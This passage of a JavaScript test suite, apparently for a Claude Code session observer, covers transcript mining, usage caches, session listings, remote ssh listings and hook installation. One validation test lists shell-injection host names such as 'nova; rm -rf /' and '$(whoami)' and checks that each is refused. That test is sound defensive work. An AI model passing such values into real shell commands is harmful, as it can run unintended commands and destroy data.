  seedEdit(S, F, 'B\n', 'C\n'); // #3 Edit
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  const tx = [
    { message: { role: 'assistant', content: [{ type: 'text', text: 'First edit.' }, { type: 'tool_use', name: 'Edit', input: { file_path: F } }] } },
    { message: { role: 'assistant', content: [{ type: 'text', text: 'Second edit.' }, { type: 'tool_use', name: 'Edit', input: { file_path: F } }] } },
  ].map((o) => JSON.stringify(o)).join('\n');
  fs.writeFileSync(path.join(proj, S + '.jsonl'), tx);

  const m = core.reasoningByEdit(cwd, S);
  assert.equal(m.get(1), 'First edit.', 'edit #1 gets the first tool_use reasoning');
  assert.equal(m.get(2), undefined, 'the Bash record gets no reasoning (no transcript tool_use)');
  assert.equal(m.get(3), 'Second edit.', 'edit #3 gets the second reasoning, NOT shifted by the Bash record');
});

test("observe: transcriptSuggestions surfaces Claude's latest open to-dos (zero token)", () => {
  freshHome();
  const S = 'todos';
  const cwd = tmpWork();
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  const tx = [
    // an earlier to-do list that a later one supersedes
    { message: { role: 'assistant', content: [{ type: 'tool_use', name: 'TodoWrite', input: { todos: [{ content: 'stale item', status: 'pending' }] } }] } },
    { message: { role: 'assistant', content: [
      { type: 'text', text: 'Wrapping up.' },
      { type: 'tool_use', name: 'TodoWrite', input: { todos: [
        { content: 'Done thing', status: 'completed' },
        { content: 'Write the tests', status: 'pending' },
        { content: 'Refactor parser', status: 'in_progress' },
      ] } },
    ] } },
  ].map((o) => JSON.stringify(o)).join('\n');
  fs.writeFileSync(path.join(proj, S + '.jsonl'), tx);

  const ins = core.transcriptInsights(cwd, S);
  assert.equal(ins.todos.length, 3, 'the latest TodoWrite supersedes the earlier one');
  assert.equal(ins.lastSummary, 'Wrapping up.', 'captures the last assistant summary');

  const sug = core.transcriptSuggestions(cwd, S);
  assert.deepEqual(sug, ['Write the tests', '▸ Refactor parser'], 'drops completed, marks in-progress, keeps order');
  assert.ok(!sug.some((s) => /stale|Done thing/.test(s)), 'superseded + completed items excluded');
});

test('observe: transcript mining is silent when there is no transcript', () => {
  freshHome();
  const cwd = tmpWork();
  assert.deepEqual(core.transcriptSuggestions(cwd, 'nope'), [], 'no transcript -> no suggestions');
  assert.deepEqual(core.transcriptInsights(cwd, 'nope').todos, [], 'no transcript -> no todos');
  assert.equal(core.transcriptInsights(cwd, 'nope').title, null, 'no transcript -> no title');
});

test('observe: transcriptInsights captures the latest ai-title (session recap)', () => {
  freshHome();
  const S = 'titled';
  const cwd = tmpWork();
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  const tx = [
    { type: 'ai-title', aiTitle: 'Old title' },
    { message: { role: 'assistant', content: [{ type: 'text', text: 'working' }] } },
    { type: 'ai-title', aiTitle: 'Building the Observations tab' },
  ].map((o) => JSON.stringify(o)).join('\n');
  fs.writeFileSync(path.join(proj, S + '.jsonl'), tx);
  assert.equal(core.transcriptInsights(cwd, S).title, 'Building the Observations tab', 'keeps the latest ai-title');
});

test("observe: next steps fold in a Next-steps section from Claude's recap", () => {
  freshHome();
  const S = 'recap';
  const cwd = tmpWork();
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  const summary = 'Done building.\n\n## Next steps\n\n- Wire up the parser\n- Add a regression test\n\nThanks!';
  const tx = [
    { message: { role: 'assistant', content: [{ type: 'tool_use', name: 'TodoWrite', input: { todos: [{ content: 'Ship it', status: 'in_progress' }] } }] } },
    { message: { role: 'assistant', content: [{ type: 'text', text: summary }] } },
  ].map((o) => JSON.stringify(o)).join('\n');
  fs.writeFileSync(path.join(proj, S + '.jsonl'), tx);
  const sug = core.transcriptSuggestions(cwd, S);
  assert.ok(sug.includes('▸ Ship it'), 'keeps the open to-do');
  assert.ok(sug.includes('Wire up the parser') && sug.includes('Add a regression test'), 'folds in the recap Next-steps bullets');
  assert.ok(!sug.includes('Thanks!'), 'stops at the end of the bullet section');
});

test('observe: usageLine reads context fill from the transcript usage', () => {
  freshHome();
  const S = 'usage';
  const cwd = tmpWork();
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  const tx = [
    { message: { role: 'assistant', usage: { input_tokens: 1000, cache_read_input_tokens: 40000, cache_creation_input_tokens: 9000 }, content: [{ type: 'text', text: 'hi' }] } },
  ].map((o) => JSON.stringify(o)).join('\n');
  fs.writeFileSync(path.join(proj, S + '.jsonl'), tx);
  const u = core.usageLine(cwd, S);
  assert.ok(u.ctx, 'context computed');
  assert.equal(u.ctx.tokens, 50000, 'sums input + cache read + cache creation');
  assert.equal(u.ctx.size, 200000, 'defaults to the 200k window under the threshold');
  assert.equal(Math.round(u.ctx.pct), 25, '50k/200k = 25%');
});

test('observe: usageLine prefers the exact statusline cache (ctx/5h/week + resets)', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const cwd = tmpWork();
  const claudeDir = path.join(os.homedir(), '.claude');
  fs.mkdirSync(claudeDir, { recursive: true });
  fs.writeFileSync(
    path.join(claudeDir, 'statusline-last.json'),
    JSON.stringify({
      ctx_pct: 39, ctx_used: 390000, ctx_size: 1000000,
      five_pct: 12.5, five_reset: '2099-01-01T00:00:00Z', five_tok: 4800000,
      week_pct: 27.3, week_reset: '2099-01-02T00:00:00Z', week_tok: 14000000,
    })
  );
  const u = core.usageLine(cwd, 'nosession'); // cache wins even with no transcript
  assert.equal(u.ctx.pct, 39, 'ctx% comes straight from the cache (matches the terminal)');
  assert.equal(u.ctx.tokens, 390000, 'ctx tokens from the cache');
  assert.equal(u.ctx.size, 1000000);
  assert.equal(u.fiveHourPct, 12.5, '5h from the cache');
  assert.equal(u.weekPct, 27.3, 'week from the cache');
  assert.equal(u.fiveReset, Date.parse('2099-01-01T00:00:00Z'), 'ISO reset normalized to epoch ms');
  assert.equal(u.fiveTokens, 4800000, '5h token estimate from the cache');
  assert.equal(u.weekTokens, 14000000, 'week token estimate from the cache');
});

test('observe: usageLine derives ctx tokens from pct when ctx_used is a stuck 0', () => {
  // Newer Claude Code builds stopped sending context_window token totals, so the statusline
  // persists ctx_used: 0 while ctx_pct is real — the bar must not read "0/1M".
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const cwd = tmpWork();
  const claudeDir = path.join(os.homedir(), '.claude');
  fs.mkdirSync(claudeDir, { recursive: true });
  fs.writeFileSync(
    path.join(claudeDir, 'statusline-last.json'),
    JSON.stringify({ ctx_pct: 3, ctx_used: 0, ctx_size: 1000000 })
  );
  const u = core.usageLine(cwd, 'nosession');
  assert.equal(u.ctx.pct, 3);
  assert.equal(u.ctx.tokens, 30000, '3% of 1M derived, not the stuck 0');
  assert.equal(u.ctx.size, 1000000);
});

test('observe: usageLine normalizes an epoch-seconds reset from the cache', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const cwd = tmpWork();
  const claudeDir = path.join(os.homedir(), '.claude');
  fs.mkdirSync(claudeDir, { recursive: true });
  fs.writeFileSync(
    path.join(claudeDir, 'statusline-last.json'),
    JSON.stringify({ ctx_pct: 10, ctx_size: 200000, week_pct: 5, week_reset: 1783540800 })
  );
  const u = core.usageLine(cwd, 'nosession');
  assert.equal(u.weekReset, 1783540800 * 1000, 'epoch seconds scaled to epoch ms');
});

test('sessions: a conversation that edited nothing is still a session', () => {
  // The store is not the census. A session gets a store directory the first time the capture hook
  // fires, so one that only asked, read and ran things never gets one — and every listing built from
  // `listSessions()` alone could not see it at all. Measured on the repo that found this: 50
  // transcripts, 31 store directories, 19 real conversations missing from the picker with nothing on
  // screen to say so.
  freshHome();
  const cfg = fs.mkdtempSync(path.join(os.tmpdir(), 'cc-sess-'));
  process.env.CLAUDE_CONFIG_DIR = cfg;
  try {
    const cwd = path.resolve('/Users/x/proj');
    const proj = core.projectDir(cwd);
    fs.mkdirSync(proj, { recursive: true });
    // Two transcripts here: one that also produced edits, one that produced none.
    fs.writeFileSync(path.join(proj, 'withedits.jsonl'), '{}\n');
    fs.writeFileSync(path.join(proj, 'noedits.jsonl'), '{}\n');
    // …and one belonging to a DIFFERENT workspace, which must not appear.
    const other = core.projectDir(path.resolve('/Users/x/elsewhere'));
    fs.mkdirSync(other, { recursive: true });
    fs.writeFileSync(path.join(other, 'foreign.jsonl'), '{}\n');
    // Only the first gets a store: `capture` creates it, and nothing here captured for the second.
    const store = path.join(core.rootDir(), 'withedits');
    fs.mkdirSync(store, { recursive: true });
    fs.writeFileSync(path.join(store, 'log.jsonl'), '');

    const ids = core.transcriptSessionIds(cwd);
    assert.deepEqual(ids.slice().sort(), ['noedits', 'withedits'], 'both of THIS workspace’s transcripts');
    assert.ok(!ids.includes('foreign'), 'and not another workspace’s — the walk up the tree reaches ancestors, which are other people’s projects');

    const listed = core.listSessionsWithTitles(cwd).map((s) => s.id);
    assert.ok(listed.includes('withedits'), 'the session with edits is listed');
    assert.ok(listed.includes('noedits'), 'and so is the one with none — that is the bug this pins');
    // `listSessionsWithTitles` is the STORE-plus-this-workspace listing (the `sessions` verb's data
    // is `sessionMeta`); its transcript top-up stays cwd-scoped, which `transcriptSessionIds` pins above.
    assert.ok(!listed.includes('foreign'), 'the cwd-scoped top-up does not reach another workspace');
    const zero = core.listSessionsWithTitles(cwd).find((s) => s.id === 'noedits');
    assert.equal(zero.edits, 0, 'it reports zero edits, which is the truth — nothing was captured');
    assert.equal(zero.pending, 0);

    // Positive control: the store-only path really did miss it, so this test is measuring something.
    assert.ok(!core.listSessions().some((s) => s.id === 'noedits'),
      'the store enumerator alone still cannot see it — which is why the listing had to stop relying on it');

    const meta = core.sessionMeta(cwd);
    const metaIds = meta.sessions.map((s) => s.id);
    assert.ok(metaIds.includes('noedits'), 'the fast picker path lists it too');
    // `sessionMeta` deliberately spans EVERY workspace now, so the other one's session is offered —
    // but the row has to say so. Hiding it was the old behaviour; hiding it *while showing ancestor
    // directories' sessions unlabelled* was the bug.
    const foreign = meta.sessions.find((r) => r.id === 'foreign');
    assert.ok(foreign, 'another workspace’s session is offered');
    const mine = meta.sessions.find((r) => r.id === 'withedits');
    assert.notEqual(foreign.workspace, mine.workspace, 'and its row names a different workspace');
    assert.ok(foreign.workspace && mine.workspace, 'both rows name one');
  } finally {
    delete process.env.CLAUDE_CONFIG_DIR;
  }
});

test('sessions: every workspace is listed, each row saying which one, and a bridge stub says so', () => {
  freshHome();
  const cfg = fs.mkdtempSync(path.join(os.tmpdir(), 'cc-ws-'));
  process.env.CLAUDE_CONFIG_DIR = cfg;
  try {
    const here = path.resolve('/Users/x/proj');
    const there = path.resolve('/Users/x/other');
    for (const [cwd, id] of [[here, 'mine'], [there, 'theirs']]) {
      const d = core.projectDir(cwd);
      fs.mkdirSync(d, { recursive: true });
      fs.writeFileSync(path.join(d, `${id}.jsonl`), '{"type":"user"}\n');
    }
    // A bridge POINTER: one line, no conversation. Claude Code writes these for sessions whose
    // content lives on its bridge — they are not empty local sessions, and saying "no edits" about
    // one sends the reader to open something that is not there.
    fs.writeFileSync(
      path.join(core.projectDir(here), 'bridged.jsonl'),
      JSON.stringify({ type: 'bridge-session', sessionId: 'bridged', bridgeSessionId: 'cse_x', lastSequenceNum: 900 }) + '\n'
    );

    const rows = core.sessionMeta(here).sessions;
    const byId = Object.fromEntries(rows.map((r) => [r.id, r]));
    assert.ok(byId.mine, 'this workspace’s session');
    assert.ok(byId.theirs, 'AND another workspace’s — every workspace is offered now');
    assert.notEqual(byId.mine.workspace, byId.theirs.workspace, 'each row names its own workspace');
    assert.ok(byId.mine.workspace, 'and the name is not blank — the old listing named none of them');

    assert.equal(byId.bridged.origin, 'bridged', 'a bridge pointer is reported as bridged');
    assert.equal(byId.mine.origin, 'local', 'and a real transcript as local');
    assert.deepEqual(
      core.bridgeInfo(path.join(core.projectDir(here), 'bridged.jsonl')),
      { bridgeSessionId: 'cse_x', lastSequenceNum: 900 },
      'the pointer’s own fields are read, so a renderer can say where the content went'
    );
    assert.equal(core.bridgeInfo(path.join(core.projectDir(here), 'mine.jsonl')), null,
      'and an ordinary transcript is NOT mistaken for one — this reads only the first line');

    // Labels are display strings over a lossy slug, so they are bounded and MARKED when shortened —
    // a hundred-character temp-dir slug wrapped the row it labelled and broke the whole list.
    const deep = path.resolve('/private/tmp/a-very-long-scratch-directory-name-that-keeps-going-and-going/inner');
    fs.mkdirSync(core.projectDir(deep), { recursive: true });
    fs.writeFileSync(path.join(core.projectDir(deep), 'deep.jsonl'), '{"type":"user"}\n');
    for (const w of core.listWorkspaces()) {
      assert.ok(w.label.length <= 26, `${w.label} is bounded`);
      if (w.label.length === 26) assert.ok(w.label.startsWith('…'), 'a shortened label says it was shortened');
    }
  } finally {
    delete process.env.CLAUDE_CONFIG_DIR;
  }
});

test('remote: a host is validated, a failure is REPORTED, and every label is bounded', () => {
  // A shell metacharacter never reaches ssh. This is the one place a reader-supplied string would be
  // interpolated into a remote command, so it is refused by shape before anything is spawned.
  for (const bad of ['nova; rm -rf /', 'a b', '$(whoami)', '`id`', 'x|y', '']) {
    const r = core.listRemoteSessions({ name: 'x', host: bad });
    assert.ok(r.error, `“${bad}” is refused`);
    assert.match(r.error, /not a usable ssh host name/);
    assert.equal(r.reachable, false);
    assert.deepEqual(r.sessions, []);
  }

  // A host that cannot be resolved reports WHY. An empty list standing in for a failure would tell a
  // reader their machine has no sessions when in fact it was never reached.
  const dead = core.listRemoteSessions({ name: 'dead', host: 'no-such-host-abc.invalid' }, 8000);
  assert.equal(dead.reachable, false, 'not reachable');
  assert.ok(dead.error && dead.error.length > 0, 'and it says so in words');
  assert.deepEqual(dead.sessions, [], 'with no sessions invented');

  // A failing host becomes a ROW, so it is visibly down rather than quietly absent.
  core.clearRemoteCache();
  const rows = core.remoteRows([{ name: 'dead', host: 'no-such-host-abc.invalid' }]);
  assert.equal(rows.length, 1, 'one row for the host itself');
  assert.equal(rows[0].origin, 'remote');
  assert.ok(rows[0].error, 'carrying the reason');
  core.clearRemoteCache();

  // Labels are bounded and MARKED when shortened — an unbounded one wraps the row it labels and
  // breaks the whole list, which is exactly what the composed `host:workspace` pair did at first.
  const long = '-home-someone-a-very-long-project-directory-name-that-keeps-going';
  assert.ok(core.remoteWorkspaceLabel(long).length <= 26);
  assert.ok(core.remoteWorkspaceLabel(long).startsWith('…'), 'a shortened label says so');
  assert.equal(core.remoteWorkspaceLabel('-home-thayer'), '~', 'the remote HOME is named, not spelled as a path');
  assert.equal(core.remoteWorkspaceLabel('-Users-bob'), '~');
  assert.equal(core.remoteWorkspaceLabel('-home-bob-Github-thing'), 'Github-thing', 'and the prefix is dropped');
});

test('remote: the scanner ships finished titles, and the shell fallback is told apart from it', () => {
  // The remote emits one TSV row per session. Two producers can write it — the python scanner (a
  // bridged FLAG and a finished title) and the shell fallback (the raw first line and a sample) —
  // and the parser tells them apart by the fifth field. Getting that wrong means a title of "0".
  const py = ['-home-bob-proj', 'abc', '1700000000', '4096', '0', 'Fix the widget alignment'].join('\t');
  const pyBridge = ['-home-bob-proj', 'def', '1700000000', '146', '1', ''].join('\t');
  const sh = ['-home-bob-proj', 'ghi', '1700000000', '4096', '{"type":"user","message":{"content":"hello there"}}', '{"type":"user","message":{"content":"hello there"}}'].join('\t');
  const shBridge = ['-home-bob-proj', 'jkl', '1700000000', '146', '{"type":"bridge-session"}', ''].join('\t');
  const parsed = core.__parseRemoteRows(['OK', py, pyBridge, sh, shBridge].join('\n'));
  const by = Object.fromEntries(parsed.map((r) => [r.id, r]));
  assert.equal(by.abc.title, 'Fix the widget alignment', 'a finished title crosses the wire intact');
  assert.equal(by.abc.bridged, false);
  assert.equal(by.def.bridged, true, 'the flag column is read as a flag, not as content');
  assert.equal(by.def.title, null, 'and a bridge pointer has no title to show');
  assert.equal(by.ghi.title, 'hello there', 'the fallback still extracts from its sample');
  assert.equal(by.ghi.bridged, false);
  assert.equal(by.jkl.bridged, true, 'and still detects a pointer from the raw first line');
  // Titles are shortened the same way local ones are, so the two read alike for one conversation.
  const long = ['-home-bob-proj', 'mno', '1700000000', '4096', '0', 'x'.repeat(200)].join('\t');
  const one = core.__parseRemoteRows(['OK', long].join('\n'))[0];
  assert.ok(one.title.length <= 64, 'capped');
  assert.ok(one.title.endsWith('…'), 'and marked, never silently cut');
});

test('paths: CLAUDE_CONFIG_DIR relocates the store, sessions, hooks, and usage together', () => {
  // Regression for the devcontainer split: the store/session/hook-install layer used to be pinned to
  // ~/.claude while usage/stats honored CLAUDE_CONFIG_DIR — so relocating the config dir onto a
  // mounted volume only half-worked (edit history reset on rebuild). Now ALL of them follow it.
  const home = freshHome();
  const cfg = fs.mkdtempSync(path.join(os.tmpdir(), 'cc-cfg-'));
  process.env.CLAUDE_CONFIG_DIR = cfg;
  try {
    assert.equal(core.claudeConfigDir(), cfg);
    assert.equal(core.rootDir(), path.join(cfg, 'claude-observatory'), 'edit store under CLAUDE_CONFIG_DIR');
    assert.equal(core.projectDir('/Users/x/proj'), path.join(cfg, 'projects', '-Users-x-proj'), 'transcripts under it');
    assert.equal(core.settingsPath(), path.join(cfg, 'settings.json'), 'hook install target under it');

    // and none of them leak back into the home ~/.claude
    const homeClaude = path.join(home, '.claude');
    assert.ok(!core.rootDir().startsWith(homeClaude), 'store does not fall back to ~/.claude');
    assert.ok(!core.projectDir('/Users/x/proj').startsWith(homeClaude), 'projects do not fall back to ~/.claude');

    // end-to-end: session resolution + hook install land under the relocated dir, not the home
    // (path.resolve makes the fake cwd drive-absolute on Windows, matching resolveSessionId's resolve)
    const cwd = path.resolve('/Users/x/proj');
    const proj = core.projectDir(cwd);
    fs.mkdirSync(proj, { recursive: true });
    fs.writeFileSync(path.join(proj, 'sess.jsonl'), '{}');
    assert.equal(core.resolveSessionId(cwd), 'sess', 'session resolved from the relocated projects dir');

    assert.ok(core.installHooks('claude-observatory capture #claude-observatory-hook').changed);
    assert.ok(fs.existsSync(path.join(cfg, 'settings.json')), 'hooks written under CLAUDE_CONFIG_DIR');
    assert.ok(!fs.existsSync(path.join(homeClaude, 'settings.json')), 'home ~/.claude/settings.json untouched');

    // usage cache is read from the relocated dir too
    fs.writeFileSync(path.join(cfg, 'statusline-last.json'), JSON.stringify({ ctx_pct: 42, ctx_size: 200000 }));
    const u = core.usageLine(cwd, 'sess');
    assert.equal(u.ctx.pct, 42, 'usage read from the relocated statusline cache');
    assert.equal(u.statuslineCache, true, 'cache present flag set');
  } finally {
    delete process.env.CLAUDE_CONFIG_DIR;
  }
});

test('paths: without CLAUDE_CONFIG_DIR everything falls back to ~/.claude (unchanged default)', () => {
  const home = freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const hc = path.join(home, '.claude');
  assert.equal(core.claudeConfigDir(), hc);
  assert.equal(core.rootDir(), path.join(hc, 'claude-observatory'));
  assert.equal(core.projectDir('/a/b'), path.join(hc, 'projects', '-a-b'));
  assert.equal(core.settingsPath(), path.join(hc, 'settings.json'));
});

test('observe: usageLine flags a missing statusline cache (drives the sidebar "install" hint)', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const cwd = tmpWork();
  const u = core.usageLine(cwd, 'nosession'); // no statusline-last.json, no transcript
  assert.equal(u.statuslineCache, false, 'no cache file -> false; the webview shows the install nudge');
  assert.equal(u.fiveHourPct, null);
  assert.equal(u.weekPct, null);
  assert.equal(u.cachedAtMs, null, 'no cache -> no age; the stale hint must not fire');
});

test('observe: usageLine exposes the statusline cache age (drives the sidebar "stale" hint)', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const cwd = tmpWork();
  const claudeDir = path.join(os.homedir(), '.claude');
  fs.mkdirSync(claudeDir, { recursive: true });
  const cache = path.join(claudeDir, 'statusline-last.json');
  fs.writeFileSync(cache, JSON.stringify({ ctx_pct: 39, five_pct: 12.5 }));
  const t = Date.now() - 42 * 60000; // backdate 42 minutes (utimes takes seconds; mtimeMs returns ms)
  fs.utimesSync(cache, t / 1000, t / 1000);
  const u = core.usageLine(cwd, 'nosession');
  assert.equal(u.statuslineCache, true);
  assert.ok(Math.abs(u.cachedAtMs - t) < 1500, 'cachedAtMs reflects the cache mtime');
  assert.equal(u.fiveHourPct, 12.5, 'stale values still render as last-known');
  assert.equal(typeof core.USAGE_STALE_MS, 'number', 'threshold exported for the webview');
});

test('observe: usageLine prefers a newer transcript ctx over a stale cache (panel-only sessions)', () => {
  // The VS Code panel never runs the statusLine, so the cache can be hours old while the
  // transcript is live: ctx must track the transcript; 5h/week keep the cache (their only source).
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const S = 'live';
  const cwd = tmpWork();
  const claudeDir = path.join(os.homedir(), '.claude');
  fs.mkdirSync(claudeDir, { recursive: true });
  const cache = path.join(claudeDir, 'statusline-last.json');
  fs.writeFileSync(cache, JSON.stringify({ ctx_pct: 39, ctx_used: 78000, ctx_size: 200000, five_pct: 12.5, five_reset: '2099-01-01T00:00:00Z' }));
  const old = Date.now() - 3600 * 1000;
  fs.utimesSync(cache, old / 1000, old / 1000);
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  fs.writeFileSync(
    path.join(proj, S + '.jsonl'),
    JSON.stringify({ message: { role: 'assistant', usage: { input_tokens: 1000, cache_read_input_tokens: 40000, cache_creation_input_tokens: 9000 }, content: [] } })
  );
  const u = core.usageLine(cwd, S);
  assert.equal(u.ctx.tokens, 50000, 'ctx re-derived from the newer transcript');
  assert.equal(Math.round(u.ctx.pct), 25, 'not the stale 39% from the cache');
  assert.equal(u.fiveHourPct, 12.5, '5h still comes from the cache');
  assert.equal(u.statuslineCache, true);
  assert.ok(Math.abs(u.cachedAtMs - old) < 1500, 'age reported so the UI can flag staleness');
});

test('observe: usageLine keeps the exact cache ctx when the cache is newer than the transcript', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const S = 'term';
  const cwd = tmpWork();
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  const tx = path.join(proj, S + '.jsonl');
  fs.writeFileSync(tx, JSON.stringify({ message: { role: 'assistant', usage: { input_tokens: 1000, cache_read_input_tokens: 40000 }, content: [] } }));
  const old = Date.now() - 3600 * 1000;
  fs.utimesSync(tx, old / 1000, old / 1000);
  const claudeDir = path.join(os.homedir(), '.claude');
  fs.mkdirSync(claudeDir, { recursive: true });
  fs.writeFileSync(path.join(claudeDir, 'statusline-last.json'), JSON.stringify({ ctx_pct: 39, ctx_used: 78000, ctx_size: 200000 }));
  const u = core.usageLine(cwd, S);
  assert.equal(u.ctx.pct, 39, 'fresh cache wins: exact terminal values, byte-identical to before');
  assert.equal(u.ctx.tokens, 78000);
});

test('stats: computeStats rolls up transcripts + edits into windows and a daily series', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const S = 'statSess';
  const now = Date.now();
  // two store edits stamped "now": one pending, one accepted (kept) — to exercise the status split
  core.ensureStore(S);
  const blob = core.writeBlob(S, Buffer.from('x\n'));
  const id1 = core.nextId(S);
  core.appendLog(S, { id: id1, ts: now, tool: 'Write', file: '/w/a.js', beforeBlob: null, afterBlob: blob, status: 'pending' });
  const id2 = core.nextId(S);
  core.appendLog(S, { id: id2, ts: now, tool: 'Edit', file: '/w/b.js', beforeBlob: null, afterBlob: blob, status: 'pending' });
  core.setStatus(S, id2, 'kept');
  // a transcript for that session with one assistant message today
  const proj = path.join(os.homedir(), '.claude', 'projects', 'proj');
  fs.mkdirSync(proj, { recursive: true });
  const tx = JSON.stringify({
    sessionId: S,
    timestamp: new Date(now).toISOString(),
    type: 'assistant',
    message: {
      role: 'assistant',
      usage: { input_tokens: 10, cache_read_input_tokens: 100, cache_creation_input_tokens: 0, output_tokens: 50 },
      content: [{ type: 'thinking', thinking: 'abcdefghijklmnop' }, { type: 'text', text: 'hi' }],
    },
  });
  fs.writeFileSync(path.join(proj, S + '.jsonl'), tx);

  const st = core.computeStats(S, now);
  assert.equal(st.daily.length, 30, '30-day series');
  const today = st.daily[st.daily.length - 1];
  assert.equal(today.messages, 1, 'today: one assistant message');
  assert.equal(today.tokensOutput, 50, 'today: output tokens');
  assert.equal(today.tokensInput, 110, 'today: input+cache (10+100+0)');
  assert.equal(today.thinking, 4, 'today: thinking ~= 16 chars / 4');
  assert.equal(today.editsPending, 1, 'today: one pending edit');
  assert.equal(today.editsKept, 1, 'today: one accepted edit');
  assert.equal(today.editsUndone, 0, 'today: none reverted');
  assert.equal(st.windows.session.messages, 1, 'session window: transcript messages');
  assert.equal(st.windows.session.edits, 2, 'session window: both store edits');
  assert.equal(st.windows.session.output, 50, 'session window: output tokens');
  assert.equal(st.windows.week.output, 50, '7-day window includes today');
  // hourly (today)
  assert.equal(st.hourly.length, 24, '24 hourly buckets');
  const hr = new Date(now).getHours();
  assert.equal(st.hourly[hr].messages, 1, 'message lands in its hour');
  assert.equal(st.hourly[hr].editsPending, 1, 'pending edit in its hour');
  assert.equal(st.hourly[hr].editsKept, 1, 'accepted edit in its hour');
  assert.equal(st.hourly[hr].tokensInput, 110, 'hourly input tokens');
  assert.equal(st.hourly[hr].tokensOutput, 50, 'hourly output tokens');
});

test('stats: one assistant message split across content-block lines is counted once (no multi-count)', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const S = 'splitSess';
  const now = Date.now();
  const proj = path.join(os.homedir(), '.claude', 'projects', 'proj');
  fs.mkdirSync(proj, { recursive: true });
  // Current Claude Code writes ONE line per content block, each stamped with the SAME message.id and
  // the IDENTICAL usage. Here: one logical message split into thinking+text+tool_use (3 lines).
  const usage = { input_tokens: 10, cache_read_input_tokens: 100, cache_creation_input_tokens: 0, output_tokens: 50 };
  const iso = new Date(now).toISOString();
  const mk = (content) =>
    JSON.stringify({ sessionId: S, timestamp: iso, type: 'assistant', message: { id: 'msg_split1', role: 'assistant', usage, content } });
  const lines = [
    mk([{ type: 'thinking', thinking: 'abcdefghijklmnop' }]), // 16 chars → thinking 4
    mk([{ type: 'text', text: 'hi' }]),
    mk([{ type: 'tool_use', name: 'Edit', input: { file_path: '/w/a.js' } }]),
  ];
  fs.writeFileSync(path.join(proj, S + '.jsonl'), lines.join('\n') + '\n');

  const st = core.computeStats(S, now);
  const today = st.daily[st.daily.length - 1];
  assert.equal(today.messages, 1, 'split message counts as ONE turn, not three');
  assert.equal(today.tokensOutput, 50, 'output usage counted once (not 150)');
  assert.equal(today.tokensInput, 110, 'input+cache usage counted once (not 330)');
  assert.equal(today.thinking, 4, 'thinking accrues from the thinking-block line');
  assert.equal(st.windows.session.messages, 1, 'session window: one message');
  assert.equal(st.windows.session.output, 50, 'session window: output counted once');
});

test('install: --project targets a repo-local settings file, leaving global untouched', () => {
  freshHome();
  const proj = fs.mkdtempSync(path.join(os.tmpdir(), 'cc-proj-'));
  const projSettings = core.projectSettingsPath(proj);
  const cmd = 'claude-observatory capture #claude-observatory-hook';
  const res = core.installHooks(cmd, projSettings);
  assert.ok(res.changed);
  assert.equal(res.settingsPath, projSettings);
  assert.ok(core.hooksInstalled(projSettings));
  assert.equal(core.hooksInstalled(), false, 'global settings NOT touched');
  assert.ok(core.uninstallHooks(projSettings).changed);
  assert.equal(core.hooksInstalled(projSettings), false);
});

test('install: uninstallStatusline reverts ONLY our statusline, never a user custom one', () => {
  const home = freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const cdir = path.join(home, '.claude');
  fs.mkdirSync(cdir, { recursive: true });
  const sp = path.join(cdir, 'settings.json');
  fs.writeFileSync(path.join(cdir, 'statusline.sh'), '#!/bin/bash\n');
  const ours = 'bash ' + path.join(cdir, 'statusline.sh');
  // ours → reverted, other settings preserved, script removed
  fs.writeFileSync(sp, JSON.stringify({ theme: 'dark', statusLine: { type: 'command', command: ours } }));
  let r = core.uninstallStatusline(sp);
  assert.ok(r.changed && r.scriptRemoved, 'ours is reverted + script removed');
  let d = JSON.parse(fs.readFileSync(sp, 'utf8'));
  assert.equal(d.statusLine, undefined, 'our statusLine removed');
  assert.equal(d.theme, 'dark', 'unrelated settings preserved');
  // a user's own statusLine is left untouched
  fs.writeFileSync(sp, JSON.stringify({ statusLine: { type: 'command', command: 'my-own-statusline.sh' } }));
  r = core.uninstallStatusline(sp);
  assert.equal(r.changed, false, 'a custom statusLine is NOT touched');
  assert.equal(JSON.parse(fs.readFileSync(sp, 'utf8')).statusLine.command, 'my-own-statusline.sh');
});

test('install: hooks merged non-destructively, idempotent, and reversible', () => {
  const home = freshHome();
  fs.mkdirSync(path.join(home, '.claude'), { recursive: true });
  const sp = path.join(home, '.claude', 'settings.json');
  fs.writeFileSync(sp, JSON.stringify({ permissions: { allow: ['WebSearch'] }, theme: 'dark' }));
  // A path with NO "claude" token — detection must rely on the stable marker, not the path.
  const cmd = 'node "/opt/vendor/tools/dist/capture.js" #claude-observatory-hook';

  assert.ok(core.installHooks(cmd).changed);
  assert.ok(core.hooksInstalled());
  let d = JSON.parse(fs.readFileSync(sp, 'utf8'));
  assert.deepEqual(d.permissions.allow, ['WebSearch']);
  assert.equal(d.theme, 'dark');
  assert.equal(d.hooks.PreToolUse[0].hooks.length, 1);
  assert.equal(d.hooks.PostToolUse[0].hooks.length, 1);

  assert.equal(core.installHooks(cmd).changed, false, 'idempotent');
  d = JSON.parse(fs.readFileSync(sp, 'utf8'));
  assert.equal(d.hooks.PreToolUse[0].hooks.length, 1, 'no duplicate');

  assert.ok(core.uninstallHooks().changed);
  assert.equal(core.hooksInstalled(), false);
  assert.deepEqual(JSON.parse(fs.readFileSync(sp, 'utf8')).permissions.allow, ['WebSearch']);
});

test('install: isOurCommand uses the stable marker (path-independent) + legacy fallbacks', () => {
  // Primary: the marker works no matter where the package lives.
